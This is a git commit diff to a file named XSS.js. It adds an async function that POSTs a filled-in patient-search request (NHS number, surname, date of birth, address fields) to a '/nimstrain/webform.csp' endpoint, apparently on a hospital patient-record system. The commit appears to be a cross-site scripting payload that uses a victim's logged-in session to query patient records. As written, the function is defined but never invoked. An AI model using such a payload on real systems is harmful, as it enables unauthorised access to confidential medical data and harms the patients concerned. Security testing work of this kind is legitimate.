417d9487a88eb03dc6a7ad78fb4dc49dc65a1d18
JDL-84 <James.lynes@googlemail.com>
2020-08-28 22:11:43 +0100

    Update XSS.js

--- XSS.js
+++ XSS.js
@@ -10,3 +10,11 @@ var CurrDT          = new Date();
 var TimeAsMS        = CurrDT.getTime();
 var LastRefresh = TimeAsMS;
 var timeoutlength = 9999000;
+
+
+async () => {
+ const xhr = new XMLHttpRequest();
+ xhr.open("POST", "/nimstrain/webform.csp?screen=webpscps.csp", true);
+ xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
+ xhr.send("webPSnhs=&webPSotherid=&webPSsurname=smith&webPSforename=&webPSmidname=&webPSdob=&webPSsex=&webSubmitBTN=%A0%A0%A0%A0Find%A0%A0%A0%A0&webPSsurnameincother=1&webPSaddress=&webPSpcode=&webPSgp=&webPSorg=1&displaydeswebPSorg=Top+Level&webPSorderby=webPRnamstr&Update=1&Submit=submitFind&webPSsearchtitle=&webPSresultstitle=&webSTORE=&webPSidall=&websession=1");
+}
